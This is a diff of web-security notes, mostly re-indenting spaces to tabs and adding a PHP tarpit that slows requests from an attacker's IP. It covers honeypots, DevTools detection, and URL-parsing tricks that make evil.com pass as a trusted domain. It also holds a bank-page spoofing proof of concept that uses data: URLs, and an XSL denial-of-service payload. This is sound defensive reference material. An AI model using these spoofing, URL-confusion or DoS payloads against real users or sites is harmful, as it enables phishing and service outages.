@@ -154,14 +154,14 @@ Content submission: bots create account, add review, video, message / post (SPAM
 - denunciation / reporting
 - blacklist or whitelists of IPs (or ranges), browsers, clients names, words, etc.
 - use `/robots.txt`:
-    ```
+	```
 	User-agent: *
 	Disallow: /
-    ```
+	```
 - use honeypots
 	"It's a trap"
-    
-    ```html
+	
+	```html
 	<!-- Require CSS support. Add hidden (display: none) input field and detect if it's filled. -->
 	<style>
 	/* email h0n3yp07 */
@@ -172,7 +172,21 @@ Content submission: bots create account, add review, video, message / post (SPAM
 	<input id="real_email" type="email" name="real_email" size="25" value="">
 	<input id="test_email" type="email" name="email" size="25" value="">
 	<!-- if test_email if filled, the sender have a high probability to trick you -->
-    ```
+	```
+	
+	```php
+	// Cut down on registration spam using long-polling. If the attackers detech blocking and switch to a different IP/host, instead slow them down.
+	// Note: this is not resource free like max concurrent connections or reach script timeout
+	header( 'Content-type: text/html; charset=utf-8' );
+	if($user_ip == 'attackerIP') {
+		for ($i = 0; $i < 10000; $i++) {
+			echo " ";// write random byte
+			flush();
+			ob_flush();
+			sleep(10);// sleep 10 seconds
+		}
+	}
+	```
 
 	Or add hidden fake entries (for a directory page with list of file). If the link is accessed, there is a high probability it's a scrapper. What append if the trigger link is discovered and inserted in ads / others websites (to trigger false positive)... by using rotation (detect only in some periode of time)?
 	
@@ -198,15 +212,15 @@ For contexts where code/data is given to untrusted parties (games, webapp, downl
 - encrypted files (code) use param provided by the preloader. If the default value is used instead, the app run in a standalone mode: someone try to hack it (track IP + all infos)
 - Always force a fresh download of preloaders (dynamically generated?)
 - no hard coded keys, tokens and IDs in source code
-    - `/admin/.git/config`, `/backup20200227.zip`, etc.
-    - [Bots also regularly check for .git in common folders: 404 - GET /admin/.git/con... | Hacker News](https://news.ycombinator.com/item?id=22431627)
+	- `/admin/.git/config`, `/backup20200227.zip`, etc.
+	- [Bots also regularly check for .git in common folders: 404 - GET /admin/.git/con... | Hacker News](https://news.ycombinator.com/item?id=22431627)
 - remove debug symbols
 - save value snapshots at random time interval
 - check memory alteration. Never store a numeric or a string of the result / score. Use pointer, etc.
 - use intergrity checks / DRM: [Subresource Integrity](#subresource-integrity), native non overwritable class method of VM API, etc.
 - detect tools and modifications:
 
-    ```js
+	```js
 	// See [795547 - Detecting deveoper tools open status kinda againis your princibles - chromium - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=795547#c8)
 	// See [799791 - DevTools can be detected using redefined nodeType getter - chromium - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=799791#c3)
 	Object.defineProperty(new Image()/*document.createElement("any")*/, "nodeType", {
@@ -216,8 +230,8 @@ For contexts where code/data is given to untrusted parties (games, webapp, downl
 		}
 	});
 	```
-    
-    ```js
+	
+	```js
 	var minimalUserResponseInMiliseconds = 100;
 	var before = Date.now();
 	debugger;
@@ -286,9 +300,9 @@ For contexts where code/data is given to untrusted parties (games, webapp, downl
 	};
 	
 	setTimeout(measure, 200);
-    ```
+	```
 
-    ```js
+	```js
 	var threshold = 160;
 	setInterval(function () {
 			var widthThreshold = window.outerWidth - window.innerWidth > threshold;
@@ -300,7 +314,7 @@ For contexts where code/data is given to untrusted parties (games, webapp, downl
 				// devtools is closed (or undocked, or a sidebar is opened)
 			}
 	}, 500);
-    ```
+	```
 	
 	- [DevTools Undocked · Issue #15 · sindresorhus/devtools-detect · GitHub](https://github.com/sindresorhus/devtools-detect/issues/15#issuecomment-215908435)
 	- [sindresorhus/devtools-detect: Detect if DevTools is open and its orientation](https://github.com/sindresorhus/devtools-detect)
@@ -413,10 +427,10 @@ See also:
 - `http://good.com%2f@evil.com/` the domain is `evil.com`
 - `https://evil.com/..;@good.com:%344/` the domain is `evil.com`. [HOW FRCKN' HARD IS IT TO UNDERSTAND A URL?! - uXSS CVE-2018-6128 - YouTube](https://www.youtube.com/watch?v=0uejy9aCNbI)
 - `http://1.1.1.1 &@2.2.2.2# @3.3.3.3` (with spaces) the host is `2.2.2.2` RFC 3986: "In some cases, extra whitespace (spaces, line-breaks, tabs, etc.) may have to be added to break a long URI across lines. The whitespace should be ignored when the URI is extracted"
-    - [#HITBGSEC 2017 SG Conf D1 - A New Era Of SSRF - Exploiting Url Parsers - Orange Tsai - YouTube](https://www.youtube.com/watch?v=D1S-G8rJrEk)
-    - [Anomalie 32085 : \[Security\] A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - Python tracker](https://bugs.python.org/issue32085)
-    - [Orange: How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
-    - https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
+	- [#HITBGSEC 2017 SG Conf D1 - A New Era Of SSRF - Exploiting Url Parsers - Orange Tsai - YouTube](https://www.youtube.com/watch?v=D1S-G8rJrEk)
+	- [Anomalie 32085 : \[Security\] A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - Python tracker](https://bugs.python.org/issue32085)
+	- [Orange: How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
+	- https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
 - `file://my.domain/tmp/example.html` the domain is `my.domain` (but often ignored)
 - `https://accounts.youtube.com/accounts/SetSID?continue=https://www.google.com/amp/s/evil.com/evil.swf` (redirect to `evil.swf`) redirection (account login, etc.) don't know if the trusted target, has been compromized (or allow this kind of redirection)
 - `http://good.com%0a%0a%0aTrust%20me.%20It%27s%20totally%20legit.%09%09%09%09%09%0a%0a%0a%0a%0a%0a%0a%0a@evil.com/` is a valid URL, but could be displayed in browser URL bar (or link hover) as `http://good.com`
@@ -760,8 +774,8 @@ On each client machine:
 </details>
 
 - mkcert:
-    - [FiloSottile/mkcert: A simple zero-config tool to make locally trusted development certificates with any names you'd like.](https://github.com/FiloSottile/mkcert)
-    - [mkcert: valid HTTPS certificates for localhost](https://blog.filippo.io/mkcert-valid-https-certificates-for-localhost/) (*.localhost domains)
+	- [FiloSottile/mkcert: A simple zero-config tool to make locally trusted development certificates with any names you'd like.](https://github.com/FiloSottile/mkcert)
+	- [mkcert: valid HTTPS certificates for localhost](https://blog.filippo.io/mkcert-valid-https-certificates-for-localhost/) (*.localhost domains)
 - [Certificates for localhost - Let's Encrypt - Free SSL/TLS Certificates](https://letsencrypt.org/docs/certificates-for-localhost/#making-and-trusting-your-own-certificates)
 - [ssl - Difference between self-signed CA and self-signed certificate - Stack Overflow](https://stackoverflow.com/questions/4024393/difference-between-self-signed-ca-and-self-signed-certificate)
 - [Self-signed SSL certificates, CA flagged true, for Android and OS X | Best Mac Tips](http://best-mac-tips.com/2015/05/28/self-signed-ssl-certificates-ca-true-android-os-x/)
@@ -1216,13 +1230,13 @@ Look like phishing / spoofing trusted UI
 
 <div id="myId"></div>
 <script>
-myId                            // [object HTMLDivElement]
-myId.id                         // "myId"
-window.myId.id                  // "myId"
-this.myId.id                    // "myId"
-self.myId.id                    // "myId"
-top.myId.id                     // "myId"
-"myId" in window                // true
+myId							// [object HTMLDivElement]
+myId.id						 // "myId"
+window.myId.id				  // "myId"
+this.myId.id					// "myId"
+self.myId.id					// "myId"
+top.myId.id					 // "myId"
+"myId" in window				// true
 window.hasOwnProperty("myId")   // true
 </script>
 ```
@@ -1349,14 +1363,14 @@ very rapidly, especially with history.*? What are the implications for
 clickjacking & friends?
 */
 var spaces = 
-  "                                                                          " +
-  "                                                                          " +
-  "                                                                          " +
-  "                                                                          " +
-  "                                                                          " +
-  "                                                                          " +
-  "                                                                          " +
-  "                                                                          ";
+  "																		  " +
+  "																		  " +
+  "																		  " +
+  "																		  " +
+  "																		  " +
+  "																		  " +
+  "																		  " +
+  "																		  ";
 var bank_html =
   '<title>Beaver Peak Banking and BBQ</title>' +
   '<img src="http://banking.beaver-peak.us/banking_interface/beaver-peak.jpg" style="float: left; margin-right: 10px">' +
@@ -1373,8 +1387,8 @@ var fakeURL = 'http://banking.coredump.cx/us/banking_interface/';
 function dostuff() {
   /* Precache */
   if (navigator.userAgent.indexOf('; MSIE') != -1) {
-    var x = new Image();
-    x.src = fakeURL;
+	var x = new Image();
+	x.src = fakeURL;
   }
   w = window.open(originalURL, 'target');
   setTimeout(dostuff2, 7500);
@@ -1382,11 +1396,11 @@ function dostuff() {
 
 function dostuff2() {
   if (navigator.userAgent.indexOf('; MSIE') != -1)
-    w.open(fakeURL,'target');
+	w.open(fakeURL,'target');
   else if (navigator.userAgent.indexOf('Opera/') != -1)
-    w.location.replace('data:text/html;charset=UTF-8,.beaver-peak.us/banking_interface/' + spaces + ',' + escape(bank_html));
+	w.location.replace('data:text/html;charset=UTF-8,.beaver-peak.us/banking_interface/' + spaces + ',' + escape(bank_html));
   else
-    w.location.replace('data:text/html;charset=UTF-8,-peak.us/banking_interface/' + spaces + ',' + escape(bank_html));
+	w.location.replace('data:text/html;charset=UTF-8,-peak.us/banking_interface/' + spaces + ',' + escape(bank_html));
 }
 </script>
 <p>illustrates the effectiveness of using
@@ -1611,7 +1625,7 @@ All browsers/libs don't handle the same way this files
 - [Billion laughs](https://www.owasp.org/index.php/XML_Security_Cheat_Sheet#Billion_Laughs)
 - [quadratic blowup](https://www.owasp.org/index.php/XML_Security_Cheat_Sheet#Quadratic_Blowup)
 - XSL DoS attack
-    ```xml
+	```xml
 	<?xml version="1.0"?>
 	<?xml-stylesheet type="text/xsl" href="#stylesheet"?>
 	<!DOCTYPE responses [
@@ -1655,7 +1669,7 @@ All browsers/libs don't handle the same way this files
 			</xsl:template>
 		</xsl:stylesheet>
 	</root>
-    ```
+	```
 	
 	- [Security: A harmless SVG + XSLT curiousity](http://scarybeastsecurity.blogspot.fr/2011/01/harmless-svg-xslt-curiousity.html)
 - etc.
